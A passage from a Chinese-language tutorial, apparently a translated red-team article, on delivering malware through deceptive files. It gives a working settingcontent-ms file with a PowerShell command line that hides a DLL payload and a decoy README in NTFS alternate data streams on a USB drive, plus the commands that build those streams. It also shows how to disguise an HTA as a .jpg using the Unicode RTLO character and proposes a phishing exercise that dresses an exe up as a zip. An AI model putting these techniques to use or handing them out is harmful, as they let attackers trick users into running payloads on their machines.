由于settingcontent-ms文件遵循严格的XML规范，因此貌似我们无法像前一种方法那样将其与HTA文件融合起来。这里我们可以使用NTFS的Alternate Data
Streams（ADS，供选数据流）来隐藏并运行DLL载荷。
这个settingcontent-ms文件将会执行隐藏在Alternate Data Stream（README.txt.settingcontent-ms:R）中的DLL，也会运行Notepad来显示另一个ADS（README.txt.settingcontent-ms:T.txt）中存放的欺诈文本。
settingcontent-ms文件的优势在于它不会像LNK或者URI文件那样图标上有个快捷箭头。
###  构建欺诈文本
首先我们可以构建一个简单的文本文件，当目标用户打开readme文件时就会在notepad中看到具体内容。
    echo "This is a simple README file." > Text.txt
###  构建恶意设置快捷方式文件
我们可以使用[macro_pack](https://github.com/sevagas/macro_pack)来生成settincontent-ms文件。比如，我们可以使用如下命令来生成一个伪造的`README.txt`文件，该文件可以通过命令行来运行计算器应用：
    echo 'C:windowssystem32cmd.exe /c calc.exe' '.' |  macro_pack.exe -G README.txt.settingcontent-ms
能弹出计算器的确很不错，但我们真正需要的是能够运行载荷。DLL以及欺诈文件会隐藏在USB介质NTFS文件系统的Alternate Data
Stream中。我们所面临的问题在于settingcontent-ms文件默认会在“C:windowssystem32”中打开，这意味着我们需要找到一种方法来定位USB介质所对应的卷标。我使用了powershell来完成这个任务，可能还有其他方法能够解决这个问题。
我希望执行的命令行如下所示：
    %windir%system32cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name;Start-Process "notepad.exe" "$driveREADME.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$driveREADME.txt.settingcontent-ms:R"
这段命令所做的操作包括：
1、调用wmi来获取USB卷名，存放到`$drive`变量中；
2、运行notepad打开`README.txt.settingcontent-ms:T.txt`中的诱骗文件。
3、运行`control.exe`来加载`README.txt.settingcontent-ms:R`中的DLL载荷。
需要注意的是，这里我们可以参考上一种场景，使用rundll32来运行DLL，然而我想尝试一下其他方法。
构造完毕的`README.txt.settingcontent-ms`文件如下所示：
          windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel
          %windir%system32cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name;Start-Process "notepad.exe" "$driveREADME.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$driveREADME.txt.settingcontent-ms:R"
          .
          {12B1697E-D3A0-4DBC-B568-CCF64A3F934D}
          @shell32.dll,-4161
          @shell32.dll,-4161
###  创建Alternative Data Stream
首先，我们需要确保USB介质已经使用NTFS文件系统格式化过。
其次，将`README.txt.settingcontent-ms`文件移动到NTFS USB介质中。
在这个例子中，USB介质所对应的卷标为“G:”。
现在我们可以来构建ADS。
首先是包含DLL的`README.txt.settingcontent-ms:R`流：
    type payload.dll > G:README.txt.settingcontent-ms:R
然后是包含诱骗文本的`G:README.txt.settingcontent-ms:T.txt`流：
    type Text.txt > G:README.txt.settingcontent-ms:T.txt
我们可以使用sysinternal的“Streams”工具来检查创建的ADS的确对应USB介质上的文件。
> 注意：如果我们编辑并保存USB介质上的`README.txt.settingcontent-ms`，那么与文件关联的Alternate Data
> Stream就会丢失，我们不得不重新执行以上两条命令。
###  测试
将制作好的U盘插入另一台Windows
10主机上。访问这个U盘，双击“README.txt”。我们可以看到DLL被成功加载，并且notepad会自动打开，展示“This is a simple
README file. ”文本。
## 四、利用Unicode RTLO
**目标系统：** MS Windows以及其他系统
**主要原理：** 实话实说我已不记得最早在哪看到这种方法。
###  利用策略
这一次我们准备构造一个欺诈文件后缀名，具体方法是注入Unicode Right-To-Left-Overrive（RTLO）字符。这是隐藏文件扩展名的一种绝佳方法，因为在RTLO之后的所有字符将以从右到左的方式呈现给用户。
比如，我可以使用macro_pack来构造能够运行计算器的一个HTA文件，该文件带有伪造的“.jpg”扩展名。具体命令如下：
    echo calc.exe | macro_pack.exe -t CMD -G calc.hta --unicode-rtlo=jpg
在资源管理器中，这个文件看起来像是`calcath.jpg`，而实际上它的文件名为`calc[rtlo]gpj.hta`。
这种方法非常有趣，并且也适用于其他操作系统（如Ubuntu），也有可能适用于其他应用程序，如邮件客户端等。
###  练习
我们可以通过多种方法来利用unicode RTLO实施钓鱼攻击。
比如，一种方法就是将恶意的exe文件伪装成zip文件（更改文件图标，同时使用RTLO方法使文件名看起来以`.zip`后缀名结束）。
在某个攻击场景中，当目标用户双击伪造的zip文件后，exe文件就会运行载荷，打开隐藏在文件资源区或者ADS中的zip诱骗文件。
这个任务就留给大家来练习吧 🙂
审核人：yiwang 编辑：边边